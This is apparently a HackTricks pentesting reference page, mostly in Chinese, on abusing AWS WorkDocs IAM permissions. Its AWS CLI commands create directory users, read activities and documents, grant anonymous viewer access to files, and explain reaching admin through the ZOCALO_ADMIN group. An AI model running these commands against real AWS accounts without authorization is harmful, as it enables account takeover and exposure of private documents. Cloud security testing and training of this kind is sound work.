# AWS - WorkDocs Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## WorkDocs

关于 WorkDocs 的更多信息请参阅：

{{#ref}}
../../aws-services/aws-directory-services-workdocs-enum.md
{{#endref}}

### `workdocs:CreateUser`

在指定的 Directory 中创建一个用户，然后您将能够访问 WorkDocs 和 AD：
```bash
# Create user (created inside the AD)
aws workdocs create-user --username testingasd --given-name testingasd --surname testingasd --password <password> --email-address name@directory.domain --organization-id <directory-id>
```
### `workdocs:GetDocument`, `(workdocs:`DescribeActivities`)`

这些文件可能包含敏感信息，请读取它们：
```bash
# Get what was created in the directory
aws workdocs describe-activities --organization-id <directory-id>

# Get what each user has created
aws workdocs describe-activities --user-id "S-1-5-21-377..."

# Get file (a url to access with the content will be retreived)
aws workdocs get-document --document-id <doc-id>
```
### `workdocs:AddResourcePermissions`

如果你没有读取某项内容的权限，你可以直接授予该权限。
```bash
# Add permission so anyway can see the file
aws workdocs add-resource-permissions --resource-id <id> --principals Id=anonymous,Type=ANONYMOUS,Role=VIEWER
## This will give an id, the file will be acesible in: https://<name>.awsapps.com/workdocs/index.html#/share/document/<id>
```
### `workdocs:AddUserToGroup`

你可以通过将用户加入组 ZOCALO_ADMIN 来使其成为管理员。\
为此请参照 [https://docs.aws.amazon.com/workdocs/latest/adminguide/manage_set_admin.html](https://docs.aws.amazon.com/workdocs/latest/adminguide/manage_set_admin.html)

使用该用户在 workdoc 登录并访问管理面板 `/workdocs/index.html#/admin`

我没找到任何方法可以通过 cli 完成此操作。




{{#include ../../../../banners/hacktricks-training.md}}
